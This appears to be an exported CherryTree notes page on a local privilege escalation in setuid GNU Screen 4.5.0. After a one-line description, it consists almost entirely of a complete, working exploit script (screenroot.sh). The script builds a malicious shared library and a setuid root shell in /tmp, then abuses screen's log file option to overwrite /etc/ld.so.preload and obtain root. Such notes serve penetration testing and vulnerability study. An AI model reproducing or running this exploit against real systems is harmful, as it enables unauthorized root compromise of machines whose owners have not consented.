<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>screen</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>screen</h1><br/><br /><br />The popular terminal multiplexerÂ <a href="https://linux.die.net/man/1/screen">Screen</a> version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.<br /><br /><br /><br />Exploit:<br /><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br /><span style="color:#0088ff;font-weight:400"># screenroot.sh</span><br /><span style="color:#0088ff;font-weight:400"># setuid screen v4.5.0 local root exploit</span><br /><span style="color:#0088ff;font-weight:400"># abuses ld.so.preload overwriting to get root.</span><br /><span style="color:#0088ff;font-weight:400"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br /><span style="color:#0088ff;font-weight:400"># HACK THE PLANET</span><br /><span style="color:#0088ff;font-weight:400"># ~ infodox (25/1/2017)</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;~ gnu/screenroot ~&quot;</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;[+] First, we create our shell and library...&quot;</span><br /><span style="color:#ff9d00;font-weight:700">cat</span> &lt;&lt; EOF &gt; <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>libhax.c<br /><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;sys/types.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;unistd.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;sys/stat.h&gt;</span><br />__attribute__ <span style="color:#ff9d00;font-weight:700">((</span>__constructor__<span style="color:#ff9d00;font-weight:700">))</span><br />void dropshell<span style="color:#ff9d00;font-weight:700">(</span>void<span style="color:#ff9d00;font-weight:700">){</span><br />    <span style="color:#ff9d00;font-weight:700">chown(</span><span style="color:#3ad900;font-weight:400">&quot;/tmp/rootshell&quot;</span>, 0, 0<span style="color:#ff9d00;font-weight:700">);</span><br />    <span style="color:#ff9d00;font-weight:700">chmod(</span><span style="color:#3ad900;font-weight:400">&quot;/tmp/rootshell&quot;</span>, 04755<span style="color:#ff9d00;font-weight:700">);</span><br />    <span style="color:#ff9d00;font-weight:700">unlink(</span><span style="color:#3ad900;font-weight:400">&quot;/etc/ld.so.preload&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br />    <span style="color:#ff9d00;font-weight:700">printf(</span><span style="color:#3ad900;font-weight:400">&quot;[+] done!\n&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span><br />EOF<br /><span style="color:#ff9d00;font-weight:700">gcc</span> -fPIC -shared -ldl -o <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>libhax.so <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>libhax.c<br /><span style="color:#ff9d00;font-weight:700">rm</span> -f <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>libhax.c<br /><span style="color:#ff9d00;font-weight:700">cat</span> &lt;&lt; EOF &gt; <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootshell.c<br /><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br />int main<span style="color:#ff9d00;font-weight:700">(</span>void<span style="color:#ff9d00;font-weight:700">){</span><br />    setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    setgid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    seteuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    setegid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    execvp<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/sh&quot;</span>, NULL, NULL<span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span><br />EOF<br /><span style="color:#ff9d00;font-weight:700">gcc</span> -o <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootshell <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootshell.c -Wno-implicit-function-declaration<br /><span style="color:#ff9d00;font-weight:700">rm</span> -f <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootshell.c<br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br /><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<br /><span style="color:#ff9d00;font-weight:700">umask</span> 000 <span style="color:#0088ff;font-weight:400"># because</span><br />screen -D -m -L ld.so.preload <span style="color:#ff9d00;font-weight:700">echo</span> -ne  <span style="color:#3ad900;font-weight:400">&quot;\x0a/tmp/libhax.so&quot;</span> <span style="color:#0088ff;font-weight:400"># newline needed</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;[+] Triggering...&quot;</span><br />screen -ls <span style="color:#0088ff;font-weight:400"># screen itself is setuid, so...</span><br /><span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootshell</pre></div><br /><br />	<br />	<a href=""><img src="images/2614-1.png" alt="images/2614-1.png" /></a></div>
</body>
</html>
